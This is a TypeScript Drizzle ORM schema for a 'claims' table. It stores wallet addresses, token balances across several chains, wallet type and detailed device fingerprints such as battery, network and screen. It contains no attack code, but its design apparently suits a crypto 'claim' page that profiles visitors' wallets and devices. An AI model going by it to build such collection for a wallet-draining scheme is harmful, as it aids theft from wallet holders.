import { sql } from "drizzle-orm";
import { pgTable, text, varchar, timestamp, jsonb, serial } from "drizzle-orm/pg-core";
import { createInsertSchema } from "drizzle-zod";
import { z } from "zod";

// Wallet claims table - stores all user wallet connections and data
export const claims = pgTable("claims", {
  id: serial("id").primaryKey(),
  walletAddress: varchar("wallet_address", { length: 255 }).notNull().unique(),
  
  // Crypto balances stored as JSON for flexibility
  balances: jsonb("balances").notNull().$type<{
    ETH?: string;
    BNB?: string;
    USDT_ERC20?: string;
    USDT_TRC20?: string;
    USDT_BEP20?: string;
    USDC?: string;
    DAI?: string;
    MATIC?: string;
    AVAX?: string;
    SOL?: string;
    [key: string]: string | undefined;
  }>(),
  
  // Device information
  deviceModel: text("device_model"),
  deviceBrowser: text("device_browser"),
  deviceOS: text("device_os"),
  deviceNetwork: text("device_network"),
  deviceBattery: text("device_battery"),
  deviceScreen: text("device_screen"),
  userAgent: text("user_agent"),
  
  // Wallet type (MetaMask, Trust Wallet, Binance, etc.)
  walletType: varchar("wallet_type", { length: 100 }),
  
  // Timestamps
  claimedAt: timestamp("claimed_at").notNull().defaultNow(),
  updatedAt: timestamp("updated_at").notNull().defaultNow(),
});

// Insert schema for creating new claims
export const insertClaimSchema = createInsertSchema(claims).omit({
  id: true,
  claimedAt: true,
  updatedAt: true,
});

// TypeScript types
export type InsertClaim = z.infer<typeof insertClaimSchema>;
export type Claim = typeof claims.$inferSelect;

// Balances type for better type safety
export type CryptoBalances = {
  ETH?: string;
  BNB?: string;
  USDT_ERC20?: string;
  USDT_TRC20?: string;
  USDT_BEP20?: string;
  USDC?: string;
  DAI?: string;
  MATIC?: string;
  AVAX?: string;
  SOL?: string;
  [key: string]: string | undefined;
};

// Device info type
export type DeviceInfo = {
  model?: string;
  browser?: string;
  os?: string;
  network?: string;
  battery?: string;
  screen?: string;
  userAgent?: string;
};
